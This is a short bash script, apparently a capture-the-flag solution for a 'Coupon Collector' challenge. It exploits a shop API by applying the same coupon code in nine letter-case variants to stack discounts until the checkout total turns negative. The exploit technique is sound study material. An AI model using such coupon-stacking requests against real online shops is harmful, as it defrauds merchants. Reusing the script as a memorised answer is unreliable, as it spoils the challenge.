#!/usr/bin/env bash
# Coupon Collector — case-variant coupon stacking to negative total
B="https://aa35dd0bffb0db57.chal.ctf.ae"
J='Content-Type: application/json'
curl -s -c c.txt "$B/api/products" >/dev/null
curl -s -b c.txt -c c.txt -H "$J" -d '{"product_id":1,"quantity":1}' "$B/api/cart" >/dev/null
for v in WELCOME20 welcome20 Welcome20 WeLcOmE20 wELCOME20 WElcome20 welCOME20 WELcome20 wELcOmE20; do
  curl -s -b c.txt -c c.txt -H "$J" -d "{\"coupon\":\"$v\"}" "$B/api/apply-coupon" >/dev/null
done
curl -s -b c.txt -c c.txt -H "$J" -d '{}' "$B/api/checkout"; echo
